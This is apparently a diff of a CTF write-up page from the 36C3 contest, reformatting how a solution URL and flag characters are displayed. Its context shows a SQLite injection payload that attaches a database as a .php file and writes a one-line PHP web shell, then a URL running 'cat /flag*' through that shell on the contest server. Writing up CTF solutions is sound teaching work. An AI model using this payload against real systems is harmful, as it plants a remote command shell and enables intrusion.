@@ -314,7 +314,9 @@ bananaboiii
 ');ATTACH DATABASE 'x.php' AS lol; INSERT INTO lol.pwn (dataz) VALUES ('&lt;?=`$_GET[1]`?&gt;');--
 </code></pre><p>The payload was stolen from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md">here</a> and modified.</p>
 <p>There are some restrictions regarding the embedded SQL payload: There's a size limit, so the payload was split into two separate files. One creates a new <code>.php</code> file and the other one writes a minimal PHP shell to it. A relative path (<code>x.php</code>) was chosen since this already points to a directory that's both writable and executable via a link.</p>
-<p>After that, visiting <code>http://78.47.152.131:8000/files/[dir]/x.php?1=cat%20/flag*</code> prints the flag:</p>
+<p>After that, visiting this link prints the flag:</p>
+<pre><code class="language-console" data-lang="console">http://78.47.152.131:8000/files/[dir]/x.php?1=cat%20/flag*`
+</code></pre><p>This is the output:</p>
 <pre><code>SQLite format 3@ .0: ��/GtablepwnpwnCREATE TABLE pwn (dataz text) ��+hxp{I should have listened to my mum about not trusting files about files}
 </code></pre><h1 id="catch-the-flag">Catch The Flag</h1>
 <p>Task description:</p>
@@ -427,8 +429,9 @@ flags <span style="color:#f92672">=</span> []
 doIt()
 </code></pre></div><p>Executing it dumps all flag characters:</p>
 <p><img src="/img/36c3ctf/dump.gif" alt="Catch The Flag"></p>
-<p>The flag characters therefore are: <code>hp0ctrw4_ax_n_0w{tg11tuhttny__0yc_3hd_d}nm</code></p>
-<p>There's only one issue: How to assemble the flag from this? I wasn't able to solve this during the CTF unfortunately :(
+<p>The flag characters therefore are:</p>
+<pre><code>hp0ctrw4_ax_n_0w{tg11tuhttny__0yc_3hd_d}nm
+</code></pre><p>There's only one issue: How to assemble the flag from this? I wasn't able to solve this during the CTF unfortunately :(
 Pls send help.</p>
 <p><em>Update: <a href="https://twitter.com/galli_leo_">@galli_leo_</a> managed to get the flag, as described <a href="https://ctftime.org/writeup/17873">here</a>. The characters move randomly - however the PRNG is seeded with</em> <code>time.time()</code>.</p>
 <p><em>Therefore the movement can be predicted :)</em></p>
